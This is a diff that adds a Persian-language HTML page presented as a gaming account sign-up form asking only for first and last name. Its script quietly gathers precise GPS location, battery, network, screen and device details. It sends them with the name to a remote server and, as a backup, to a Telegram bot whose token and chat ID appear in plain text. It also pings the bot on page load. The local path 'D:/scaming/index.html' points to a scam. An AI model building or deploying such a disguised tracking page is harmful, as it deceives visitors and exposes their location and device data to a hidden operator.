@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ثبت‌نام | پروژه‌های گیمینگ</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #0f1117;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* ===== هدر گیمینگ ===== */
+        header {
+            width: 100%;
+            max-width: 500px;
+            background-color: #161b26;
+            border-bottom: 2px solid #00ff88;
+            padding: 15px 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 255, 136, 0.15);
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header-title {
+            color: #00ff88;
+            font-size: 1.2rem;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.3);
+        }
+
+        /* ===== کارت اصلی گیمینگ ===== */
+        .game-card {
+            background: #1a202c;
+            border: 1px solid #2d3748;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 440px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* خط درخشان بالای کارت */
+        .game-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            left: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #00ff88, #a855f7);
+        }
+
+        .game-card h2 {
+            font-size: 1.4rem;
+            color: #ffffff;
+            text-align: center;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .game-card h2 i {
+            color: #a855f7;
+        }
+
+        /* فرم و فیلدها */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            color: #a0aec0;
+        }
+
+        .input-box {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-box i {
+            position: absolute;
+            right: 15px;
+            color: #a0aec0;
+            font-size: 1.1rem;
+            transition: color 0.3s ease;
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 14px 45px 14px 15px;
+            background-color: #0f1117;
+            border: 1px solid #2d3748;
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 0.95rem;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .input-box input:focus {
+            border-color: #00ff88;
+            box-shadow: 0 0 12px rgba(0, 255, 136, 0.25);
+        }
+
+        .input-box input:focus + i {
+            color: #00ff88;
+        }
+
+        /* دکمه تایید گیمینگ */
+        .btn-submit {
+            width: 100%;
+            background: linear-gradient(135deg, #00ff88 0%, #00b894 100%);
+            color: #0f1117;
+            border: none;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+            box-shadow: 0 4px 15px rgba(0, 255, 136, 0.3);
+        }
+
+        .btn-submit:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0, 255, 136, 0.5);
+        }
+
+        .btn-submit:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        /* باکس نمایش وضعیت */
+        .status-msg {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 0.88rem;
+            display: none;
+        }
+
+        .status-msg.success {
+            display: block;
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid #00ff88;
+            color: #00ff88;
+        }
+
+        .status-msg.error {
+            display: block;
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid #ff4444;
+            color: #ff4444;
+        }
+
+        .status-msg.loading {
+            display: block;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid #a855f7;
+            color: #a855f7;
+        }
+
+        /* دکمه بازگشت به منو */
+        .back-btn {
+            margin-top: 25px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid #2d3748;
+            color: #a0aec0;
+            padding: 10px 24px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .back-btn:hover {
+            background: rgba(0, 255, 136, 0.1);
+            border-color: #00ff88;
+            color: #00ff88;
+        }
+
+        .back-btn:hover i {
+            transform: translateX(4px);
+        }
+
+        .back-btn i {
+            transition: transform 0.3s ease;
+        }
+
+        /* انیمیشن لودینگ */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .fa-spinner {
+            animation: spin 1s linear infinite;
+        }
+
+        /* ===== رسپانسیو ===== */
+        @media (max-width: 480px) {
+            .game-card {
+                padding: 20px;
+            }
+            .game-card h2 {
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="header-title">
+            <i class="fa-solid fa-gamepad"></i>
+            عضویت در حساب گیمینگ
+        </div>
+    </header>
+
+    <div class="game-card">
+        <h2><i class="fa-solid fa-id-card"></i> ورود / ثبت نام</h2>
+
+        <form id="gamerForm">
+            <div class="form-group">
+                <label for="firstName">نام</label>
+                <div class="input-box">
+                    <input type="text" id="firstName" placeholder="نام خود را وارد کنید" required>
+                    <i class="fa-solid fa-user"></i>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="lastName">تخلص</label>
+                <div class="input-box">
+                    <input type="text" id="lastName" placeholder="تخلص خود را وارد کنید" required>
+                    <i class="fa-solid fa-user-astronaut"></i>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit" id="submitBtn">
+                <i class="fa-solid fa-check"></i>
+                تایید و ثبت
+            </button>
+        </form>
+
+        <div id="statusMsg" class="status-msg"></div>
+    </div>
+
+    <!-- ===== لینک به منوی اصلی (مسیر درست) ===== -->
+    <a href="file:///D:/scaming/index.html" class="back-btn">
+        <i class="fa-solid fa-arrow-right"></i>
+        بازگشت به منوی اصلی
+    </a>
+
+    <script>
+        // ================================================================
+        // 📌 1️⃣ تنظیمات اصلی
+        // ================================================================
+        const gamerForm = document.getElementById('gamerForm');
+        const statusMsg = document.getElementById('statusMsg');
+        const firstNameInput = document.getElementById('firstName');
+        const lastNameInput = document.getElementById('lastName');
+        const submitBtn = document.getElementById('submitBtn');
+
+        // ================================================================
+        // 📌 2️⃣ بیدار کردن سرور با ۲ پیام (Wake-up با ۲ درخواست)
+        // ================================================================
+        async function wakeUpServer() {
+            console.log("🔄 بیدار کردن سرور...");
+
+            // ارسال ۲ درخواست برای بیدار کردن سریع‌تر
+            const wakeUpPromises = [];
+
+            for (let i = 1; i <= 2; i++) {
+                // درخواست به سرور اصلی
+                wakeUpPromises.push(
+                    fetch("https://home-wifi-7.onrender.com/", {
+                        method: "GET"
+                    }).catch(err => console.log(`⚠️ Wake-up ${i} error:`, err))
+                );
+
+                // ارسال پیام به تلگرام از طریق سرور
+                wakeUpPromises.push(
+                    fetch("https://home-wifi-7.onrender.com/notify", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            message: `🔄 Wake-up ping (${i})`,
+                            msg: `🔄 Wake-up ping (${i})`,
+                            text: `🔄 Wake-up ping (${i})`
+                        })
+                    }).catch(err => console.log(`⚠️ Wake-up notify ${i} error:`, err))
+                );
+
+                // ارسال مستقیم به تلگرام (پشتیبان)
+                wakeUpPromises.push(
+                    fetch("https://api.telegram.org/bot8416601223:AAFR42VtKLQivbihzQNSutUS-hQ4nTNy_oQ/sendMessage", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id: "6689313262",
+                            text: `🔄 Wake-up ping (${i}) - مستقیم`,
+                            parse_mode: "Markdown"
+                        })
+                    }).catch(err => console.log(`⚠️ Telegram wake-up ${i} error:`, err))
+                );
+            }
+
+            // منتظر اجرای همه درخواست‌ها (اجرای موازی)
+            await Promise.allSettled(wakeUpPromises);
+            console.log("✅ سرور بیدار شد!");
+        }
+
+        // ================================================================
+        // 📌 3️⃣ دریافت موقعیت مکانی
+        // ================================================================
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({
+                        status: "پشتیبانی نمی‌شود",
+                        error: "مرورگر از موقعیت‌یابی پشتیبانی نمی‌کند"
+                    });
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            status: "موفق",
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + " متر",
+                            altitude: position.coords.altitude ? position.coords.altitude + " متر" : "نامشخص",
+                            heading: position.coords.heading ? position.coords.heading + " درجه" : "نامشخص",
+                            speed: position.coords.speed ? position.coords.speed + " m/s" : "نامشخص",
+                            timestamp: new Date(position.timestamp).toLocaleString('fa-IR')
+                        });
+                    },
+                    (error) => {
+                        let errorMessage = "خطای ناشناخته";
+                        switch (error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "دسترسی به موقعیت مکانی رد شد";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "موقعیت مکانی در دسترس نیست";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "زمان درخواست موقعیت به اتمام رسید";
+                                break;
+                        }
+                        resolve({
+                            status: "خطا",
+                            error: errorMessage
+                        });
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // ================================================================
+        // 📌 4️⃣ دریافت اطلاعات باتری
+        // ================================================================
+        async function getBatteryInfo() {
+            if (!('getBattery' in navigator)) {
+                return { status: "پشتیبانی نمی‌شود" };
+            }
+
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    status: "موفق",
+                    level: Math.round(battery.level * 100) + "%",
+                    charging: battery.charging ? "بله" : "خیر",
+                    chargingTime: battery.chargingTime === Infinity ? "نامشخص" : battery.chargingTime + " ثانیه",
+                    dischargingTime: battery.dischargingTime === Infinity ? "نامشخص" : battery.dischargingTime + " ثانیه"
+                };
+            } catch (error) {
+                return { status: "خطا", error: "خطا در دریافت اطلاعات باتری" };
+            }
+        }
+
+        // ================================================================
+        // 📌 5️⃣ دریافت اطلاعات شبکه
+        // ================================================================
+        function getNetworkInfo() {
+            const connection = navigator.connection || {};
+            return {
+                online: navigator.onLine ? "🟢 آنلاین" : "🔴 آفلاین",
+                effectiveType: connection.effectiveType || "نامشخص",
+                downlink: connection.downlink ? connection.downlink + " Mbps" : "نامشخص",
+                rtt: connection.rtt ? connection.rtt + " ms" : "نامشخص",
+                saveData: connection.saveData ? "فعال" : "غیرفعال"
+            };
+        }
+
+        // ================================================================
+        // 📌 6️⃣ دریافت اطلاعات دستگاه (کامل)
+        // ================================================================
+        async function getDeviceInfo() {
+            const location = await getLocation();
+            const battery = await getBatteryInfo();
+            const network = getNetworkInfo();
+            const ua = navigator.userAgent || "";
+
+            // تشخیص نوع دستگاه
+            const deviceType = /mobile/i.test(ua) ? "📱 موبایل"
+                : /tablet/i.test(ua) ? "📲 تبلت"
+                : "💻 کامپیوتر";
+
+            // تشخیص مرورگر
+            let browser = "ناشناس";
+            let browserVersion = "";
+            if (/chrome|crios/i.test(ua)) {
+                browser = "Chrome";
+                browserVersion = ua.match(/(chrome|crios)\/([0-9.]+)/i)?.[2] || "";
+            } else if (/firefox/i.test(ua)) {
+                browser = "Firefox";
+                browserVersion = ua.match(/firefox\/([0-9.]+)/i)?.[1] || "";
+            } else if (/safari/i.test(ua) && !/chrome/i.test(ua)) {
+                browser = "Safari";
+                browserVersion = ua.match(/version\/([0-9.]+)/i)?.[1] || "";
+            } else if (/edg/i.test(ua)) {
+                browser = "Edge";
+                browserVersion = ua.match(/edg\/([0-9.]+)/i)?.[1] || "";
+            } else if (/opr/i.test(ua)) {
+                browser = "Opera";
+                browserVersion = ua.match(/opr\/([0-9.]+)/i)?.[1] || "";
+            }
+
+            // تشخیص سیستم عامل
+            let os = "ناشناس";
+            let osVersion = "";
+            if (/windows nt 10/i.test(ua)) {
+                os = "Windows 10/11";
+            } else if (/windows nt 6.3/i.test(ua)) {
+                os = "Windows 8.1";
+            } else if (/windows nt 6.1/i.test(ua)) {
+                os = "Windows 7";
+            } else if (/mac os x/i.test(ua)) {
+                os = "macOS";
+                osVersion = ua.match(/mac os x ([0-9_]+)/i)?.[1].replace(/_/g, '.') || "";
+            } else if (/android/i.test(ua)) {
+                os = "Android";
+                osVersion = ua.match(/android ([0-9.]+)/i)?.[1] || "";
+            } else if (/ios|iphone|ipad/i.test(ua)) {
+                os = "iOS";
+                osVersion = ua.match(/os ([0-9_]+)/i)?.[1].replace(/_/g, '.') || "";
+            } else if (/linux/i.test(ua)) {
+                os = "Linux";
+            }
+
+            // تشخیص مدل دستگاه
+            let deviceModel = "نامشخص";
+            if (/android/i.test(ua)) {
+                if (/samsung/i.test(ua)) {
+                    deviceModel = "Samsung";
+                    const modelMatch = ua.match(/sm-[a-z0-9]+|gt-[a-z0-9]+/i);
+                    if (modelMatch) deviceModel += " " + modelMatch[0];
+                } else if (/xiaomi|redmi/i.test(ua)) {
+                    deviceModel = "Xiaomi/Redmi";
+                } else if (/huawei|honor/i.test(ua)) {
+                    deviceModel = "Huawei/Honor";
+                } else if (/oneplus/i.test(ua)) {
+                    deviceModel = "OnePlus";
+                } else if (/pixel/i.test(ua)) {
+                    deviceModel = "Google Pixel";
+                } else {
+                    deviceModel = "Android Device";
+                }
+            } else if (/iphone|ipad/i.test(ua)) {
+                deviceModel = /iphone/i.test(ua) ? "iPhone" : "iPad";
+            }
+
+            return {
+                deviceType,
+                browser,
+                browserVersion,
+                os,
+                osVersion,
+                deviceModel,
+                userAgent: ua,
+                platform: navigator.platform || "نامشخص",
+                language: navigator.language || "نامشخص",
+                languages: navigator.languages ? navigator.languages.join(', ') : "نامشخص",
+                screen: screen.width + "×" + screen.height,
+                screenAvail: screen.availWidth + "×" + screen.availHeight,
+                colorDepth: screen.colorDepth + " بیت",
+                pixelDepth: screen.pixelDepth + " بیت",
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "نامشخص",
+                hardwareConcurrency: navigator.hardwareConcurrency || "نامشخص",
+                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "نامشخص",
+                location: location,
+                battery: battery,
+                network: network,
+                date: new Date().toLocaleString('fa-IR'),
+                timestamp: Date.now()
+            };
+        }
+
+        // ================================================================
+        // 📌 7️⃣ نمایش وضعیت
+        // ================================================================
+        function showStatus(text, type = "success") {
+            statusMsg.textContent = text;
+            statusMsg.className = `status-msg ${type}`;
+        }
+
+        function hideStatus() {
+            statusMsg.className = 'status-msg';
+        }
+
+        // ================================================================
+        // 📌 8️⃣ بارگذاری اطلاعات ذخیره شده
+        // ================================================================
+        document.addEventListener('DOMContentLoaded', () => {
+            const first = localStorage.getItem('gamer_firstName');
+            const last = localStorage.getItem('gamer_lastName');
+
+            if (first && last) {
+                firstNameInput.value = first;
+                lastNameInput.value = last;
+                showStatus(`اطلاعات ذخیره شده: ${first} ${last}`, "success");
+            }
+        });
+
+        // ================================================================
+        // 📌 9️⃣ ارسال پیام به سرور (با پشتیبان‌گیری)
+        // ================================================================
+        async function sendMessage(data) {
+            // روش اول: ارسال به سرور اصلی
+            try {
+                const response = await fetch("https://home-wifi-7.onrender.com/notify", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        message: data,
+                        msg: data,
+                        text: data
+                    })
+                });
+
+                const result = await response.text();
+                console.log("✅ سرور پاسخ داد:", result);
+                return { success: true, data: result };
+            } catch (error) {
+                console.log("❌ خطا در ارسال به سرور:", error);
+
+                // روش دوم: ارسال مستقیم به تلگرام (پشتیبان)
+                try {
+                    const botToken = "8416601223:AAFR42VtKLQivbihzQNSutUS-hQ4nTNy_oQ";
+                    const chatId = "6689313262";
+
+                    const response = await fetch(
+                        `https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: data,
+                                parse_mode: "Markdown"
+                            })
+                        }
+                    );
+
+                    const result = await response.json();
+                    console.log("✅ ارسال مستقیم به تلگرام موفق:", result);
+                    return { success: true, data: result };
+                } catch (fallbackError) {
+                    console.log("❌ هر دو روش ارسال ناموفق:", fallbackError);
+                    return { success: false, error: fallbackError.message };
+                }
+            }
+        }
+
+        // ================================================================
+        // 📌 🔟 پردازش فرم ثبت‌نام (اصلی - رفع خطای تایید)
+        // ================================================================
+        gamerForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const firstName = firstNameInput.value.trim();
+            const lastName = lastNameInput.value.trim();
+
+            // ✅ اعتبارسنجی دقیق
+            if (!firstName || !lastName) {
+                showStatus("❌ لطفاً نام و تخلص خود را وارد کنید!", "error");
+                return;
+            }
+
+            // ✅ بررسی حداقل طول
+            if (firstName.length < 2 || lastName.length < 2) {
+                showStatus("❌ نام و تخلص باید حداقل ۲ کاراکتر باشند!", "error");
+                return;
+            }
+
+            // غیرفعال کردن دکمه و نمایش وضعیت لودینگ
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fa-solid fa-spinner"></i> در حال ارسال...';
+            showStatus("⏳ در حال پردازش اطلاعات...", "loading");
+
+            try {
+                // دریافت اطلاعات کامل
+                const info = await getDeviceInfo();
+
+                // ✅ ذخیره در localStorage
+                localStorage.setItem('gamer_firstName', firstName);
+                localStorage.setItem('gamer_lastName', lastName);
+                localStorage.setItem('gamer_device_info', JSON.stringify(info));
+
+                // ساخت پیام
+                let message = `
+🎮 **ثبت نام جدید گیمینگ**
+━━━━━━━━━━━━━━━━━━━━
+
+👤 **اطلاعات کاربر:**
+• نام: ${firstName}
+• تخلص: ${lastName}
+• نام کامل: ${firstName} ${lastName}
+
+📱 **اطلاعات دستگاه:**
+• نوع: ${info.deviceType}
+• مدل: ${info.deviceModel}
+• سیستم‌عامل: ${info.os} ${info.osVersion}
+• مرورگر: ${info.browser} ${info.browserVersion}
+• پلتفرم: ${info.platform}
+• هسته‌های CPU: ${info.hardwareConcurrency}
+• حافظه: ${info.deviceMemory}
+
+🌐 **اطلاعات مرورگر:**
+• زبان: ${info.language}
+• زبان‌های پشتیبانی: ${info.languages}
+• منطقه زمانی: ${info.timezone}
+
+🖥️ **صفحه نمایش:**
+• رزولوشن: ${info.screen}
+• رزولوشن قابل استفاده: ${info.screenAvail}
+• عمق رنگ: ${info.colorDepth}
+
+📶 **اطلاعات شبکه:**
+• وضعیت: ${info.network.online}
+• نوع اتصال: ${info.network.effectiveType}
+• سرعت دانلود: ${info.network.downlink}
+• تاخیر: ${info.network.rtt}
+
+📍 **موقعیت مکانی:`;
+                
+                // اضافه کردن موقعیت مکانی
+                if (info.location.status === "موفق") {
+                    message += `
+• مختصات: ${info.location.latitude}, ${info.location.longitude}
+• دقت: ${info.location.accuracy}
+• ارتفاع: ${info.location.altitude}
+• جهت: ${info.location.heading}
+• سرعت: ${info.location.speed}
+• زمان موقعیت: ${info.location.timestamp}
+🔗 نقشه: https://maps.google.com/?q=${info.location.latitude},${info.location.longitude}`;
+                } else {
+                    message += `
+• وضعیت: ${info.location.status}
+• خطا: ${info.location.error || "نامشخص"}`;
+                }
+
+                // اضافه کردن اطلاعات باتری
+                message += `
+
+🔋 **باتری:`;
+                if (info.battery.status === "موفق") {
+                    message += `
+• سطح شارژ: ${info.battery.level}
+• در حال شارژ: ${info.battery.charging}
+• زمان تا شارژ کامل: ${info.battery.chargingTime}
+• زمان تا خالی شدن: ${info.battery.dischargingTime}`;
+                } else {
+                    message += `
+• وضعیت: ${info.battery.status}`;
+                }
+
+                // اضافه کردن زمان
+                message += `
+
+⏰ **زمان ثبت:** ${info.date}
+🆔 **شناسه:** ${info.timestamp}
+
+━━━━━━━━━━━━━━━━━━━━
+📄 **User Agent:**
+\`${info.userAgent}\`
+                `;
+
+                // ✅ ارسال به سرور
+                const result = await sendMessage(message);
+
+                if (result.success) {
+                    showStatus("✅ ثبت نام با موفقیت انجام شد! در حال انتقال...", "success");
+
+                    // نمایش اطلاعات در کنسول
+                    console.log("📊 اطلاعات ثبت‌نام:", {
+                        name: firstName,
+                        lastname: lastName,
+                        device: info
+                    });
+
+                    // ✅ انتقال به صفحه اصلی بعد از ۲ ثانیه
+                    setTimeout(() => {
+                        window.location.href = "file:///D:/scaming/index.html";
+                    }, 2000);
+                } else {
+                    showStatus("❌ خطا در ارسال اطلاعات! لطفاً دوباره تلاش کنید.", "error");
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '<i class="fa-solid fa-check"></i> تایید و ثبت';
+                }
+
+            } catch (error) {
+                console.error("❌ خطا:", error);
+                showStatus("❌ خطای غیرمنتظره! لطفاً دوباره تلاش کنید.", "error");
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fa-solid fa-check"></i> تایید و ثبت';
+            }
+        });
+
+        // ================================================================
+        // 📌 1️⃣1️⃣ بیدار کردن سرور در شروع (با ۲ پیام Wake-up)
+        // ================================================================
+        (async function init() {
+            // بیدار کردن سرور با ۲ پیام
+            await wakeUpServer();
+            console.log("✅ سیستم آماده است!");
+        })();
+
+        // ================================================================
+        // 📌 1️⃣2️⃣ نمایش لاگ در کنسول
+        // ================================================================
+        console.log("✅ سیستم ثبت‌نام گیمینگ راه‌اندازی شد!");
+        console.log("📌 مسیر منو: file:///D:/scaming/index.html");
+    </script>
+
+</body>
+</html>
